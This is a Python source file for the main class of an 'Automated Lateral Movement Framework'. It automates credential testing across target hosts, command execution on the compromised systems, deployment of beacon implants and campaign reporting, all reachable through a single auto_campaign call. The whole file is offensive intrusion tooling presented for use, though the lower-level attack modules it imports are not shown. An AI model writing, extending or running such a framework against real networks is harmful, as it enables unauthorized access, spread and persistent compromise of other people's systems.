"""
Core Automated Lateral Movement Framework
Main orchestrator for all lateral movement operations
"""

import sys
from pathlib import Path
from typing import List, Optional

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from models import (
    Credential,
    AccessMatrix,
    MovementChain,
    BeaconDeployment,
    FrameworkConfig
)
from operations import CredentialTester, ChainExecutor, BeaconDeployer
from reports import ReportGenerator
from utils.output import output
from utils.files import (
    ensure_directory,
    load_targets_from_file,
    load_credentials_from_file
)


class AutomatedLateralMovement:
    """
    Main Automated Lateral Movement Framework

    Orchestrates complete lateral movement campaigns:
        1. Credential testing against targets
        2. Command execution on compromised systems
        3. Beacon deployment to expand access
        4. Comprehensive reporting

    Usage:
        framework = AutomatedLateralMovement()

        # Load data
        targets = framework.load_targets("targets.txt")
        credentials = framework.load_credentials("creds.txt")

        # Test credentials
        matrix = framework.test_credentials(targets, credentials)

        # Execute commands
        chain = framework.execute_chain(matrix, "whoami")

        # Deploy beacons
        deployments = framework.deploy_beacons(matrix, "beacon.exe")

        # Generate report
        framework.generate_report()

    Or use automated campaign:
        framework.auto_campaign("targets.txt", "creds.txt", beacon="beacon.exe")
    """

    def __init__(self, config: Optional[FrameworkConfig] = None):
        """
        Initialize framework

        Args:
            config: Optional configuration object
        """
        self.config = config or FrameworkConfig()
        self.output_dir = ensure_directory(self.config.output_dir)

        # Initialize components
        self.cred_tester = CredentialTester(timeout=self.config.test_timeout)
        self.chain_executor = ChainExecutor(timeout=self.config.timeout)
        self.beacon_deployer = BeaconDeployer(timeout=self.config.timeout)
        self.reporter = ReportGenerator(str(self.output_dir))

        # State
        self.targets: List[str] = []
        self.credentials: List[Credential] = []
        self.access_matrix: Optional[AccessMatrix] = None
        self.movement_chain: Optional[MovementChain] = None

        output.success("Automated Lateral Movement Framework initialized")
        output.success(f"Output directory: {self.output_dir}")

    def load_targets(self, targets_file: str) -> List[str]:
        """
        Load targets from file

        Args:
            targets_file: Path to targets file

        Returns:
            List of target IPs/hostnames
        """
        self.targets = load_targets_from_file(targets_file)
        return self.targets

    def load_credentials(self, creds_file: str) -> List[Credential]:
        """
        Load credentials from file

        Args:
            creds_file: Path to credentials file

        Returns:
            List of Credential objects
        """
        self.credentials = load_credentials_from_file(creds_file)
        return self.credentials

    def test_credentials(self, targets: List[str] = None,
                         credentials: List[Credential] = None) -> AccessMatrix:
        """
        Test credentials against targets

        Args:
            targets: List of targets (uses loaded if not provided)
            credentials: List of credentials (uses loaded if not provided)

        Returns:
            AccessMatrix with valid credential pairs
        """
        targets = targets or self.targets
        credentials = credentials or self.credentials

        if not targets or not credentials:
            output.failure("Need both targets and credentials")
            return AccessMatrix()

        self.access_matrix = self.cred_tester.test_all(targets, credentials)
        self.reporter.set_access_matrix(self.access_matrix)

        # Save intermediate results
        self.reporter.save_access_matrix()

        return self.access_matrix

    def execute_chain(self, access_matrix: AccessMatrix = None,
                      command: str = "whoami",
                      admin_only: bool = True) -> MovementChain:
        """
        Execute commands on accessible systems

        Args:
            access_matrix: AccessMatrix to use (uses stored if not provided)
            command: Command to execute
            admin_only: Only execute on admin-accessible systems

        Returns:
            MovementChain with execution results
        """
        matrix = access_matrix or self.access_matrix

        if not matrix or not matrix.entries:
            output.failure("No access matrix available")
            return MovementChain()

        self.movement_chain = self.chain_executor.execute_chain(
            matrix, command, admin_only
        )
        self.reporter.set_movement_chain(self.movement_chain)

        return self.movement_chain

    def deploy_beacons(self, access_matrix: AccessMatrix = None,
                       beacon_path: str = None) -> List[BeaconDeployment]:
        """
        Deploy beacons to accessible systems

        Args:
            access_matrix: AccessMatrix to use (uses stored if not provided)
            beacon_path: Path to beacon file

        Returns:
            List of BeaconDeployment results
        """
        if not beacon_path:
            output.failure("Beacon path required")
            return []

        matrix = access_matrix or self.access_matrix

        if not matrix or not matrix.entries:
            output.failure("No access matrix available")
            return []

        deployments = self.beacon_deployer.deploy_to_matrix(matrix, beacon_path)
        self.reporter.add_beacon_deployments(deployments)

        return deployments

    def generate_report(self) -> None:
        """Generate and save comprehensive report"""
        self.reporter.print_summary()
        self.reporter.save_movement_chain()
        self.reporter.save_full_report()

    def auto_campaign(self, targets_file: str, creds_file: str,
                      beacon_path: str = None,
                      command: str = "whoami") -> None:
        """
        Run fully automated lateral movement campaign

        Complete automation:
            1. Load targets and credentials
            2. Test all credential combinations
            3. Execute commands on accessible systems
            4. Deploy beacons (if provided)
            5. Generate comprehensive report

        Args:
            targets_file: Path to targets file
            creds_file: Path to credentials file
            beacon_path: Optional beacon to deploy
            command: Command to execute (default: whoami)
        """
        output.banner("AUTOMATED LATERAL MOVEMENT")

        # Load data
        targets = self.load_targets(targets_file)
        credentials = self.load_credentials(creds_file)

        if not targets or not credentials:
            output.failure("Need both targets and credentials")
            return

        # Test credentials
        access_matrix = self.test_credentials(targets, credentials)

        if not access_matrix.entries:
            output.failure("No valid credentials found")
            return

        # Execute commands
        self.execute_chain(access_matrix, command)

        # Deploy beacons if provided
        if beacon_path:
            self.deploy_beacons(access_matrix, beacon_path)

        # Generate report
        self.generate_report()

    @property
    def compromised_hosts(self) -> List[str]:
        """Get list of compromised hosts"""
        if self.movement_chain:
            return self.movement_chain.compromised_hosts
        return []